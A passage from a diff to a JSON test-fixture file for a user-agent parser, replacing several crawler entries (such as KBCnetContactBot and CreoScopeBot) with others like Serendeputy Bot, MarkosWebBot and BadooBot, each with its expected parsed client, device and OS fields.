+      "user-agent": "SerendeputyBot/0.8.6 (http://serendeputy.com/about/serendeputy-bot)"
     },
     "device": {
       "architecture": "",
@@ -4343,7 +4163,52 @@
       "bits": 0
     },
     "client": {
-      "name": "KBCnetContactBot",
+      "name": "Serendeputy Bot",
+      "modus": null,
+      "version": "0.8.6",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; Cincraw/1.0; +http://cincrawdata.net/bot/)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Cincraw",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -4366,7 +4231,7 @@
   },
   {
     "headers": {
-      "user-agent": "CreoScopeBot/0.8 (+creator intelligence; respects robots.txt)"
+      "user-agent": "Mozilla/5.0 (compatible; MarkosWebBot/2.1; +https://markosweb.com/bot.html)"
     },
     "device": {
       "architecture": "",
@@ -4388,9 +4253,9 @@
       "bits": 0
     },
     "client": {
-      "name": "CreoScopeBot",
+      "name": "MarkosWebBot",
       "modus": null,
-      "version": "0.8.0",
+      "version": "2.1.0",
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
@@ -4411,7 +4276,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; EyeAbleBrokenLinkChecker/1.0)"
+      "user-agent": "Mozilla/5.0 (compatible; qutrigobot/1.0; +https://www.qutrigo.de/qutrigo-bot.html)"
     },
     "device": {
       "architecture": "",
@@ -4433,7 +4298,7 @@
       "bits": 0
     },
     "client": {
-      "name": "EyeAbleBrokenLinkChecker",
+      "name": "qutrigobot",
       "modus": null,
       "version": "1.0.0",
       "manufacturer": "unknown",
@@ -4456,7 +4321,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; research-b2/1.0)"
+      "user-agent": "Asana/1.3.0 WebsiteMetadataRetriever"
     },
     "device": {
       "architecture": "",
@@ -4478,9 +4343,144 @@
       "bits": 0
     },
     "client": {
-      "name": "research-b2",
+      "name": "Asana",
       "modus": null,
-      "version": "1.0.0",
+      "version": "1.3.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "BorneoBot/0.7.1 (crawlcheck123@gmail.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "BorneoBot",
+      "modus": null,
+      "version": "0.7.1",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; DNSResearchBot/2.1; +http://195.37.190.77)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "DNSResearchBot",
+      "modus": null,
+      "version": "2.1.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; BadooBot; +badoo.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "BadooBot",
+      "modus": null,
+      "version": null,
       "manufacturer": "unknown",
       "type": "crawler",
       "isbot": true,
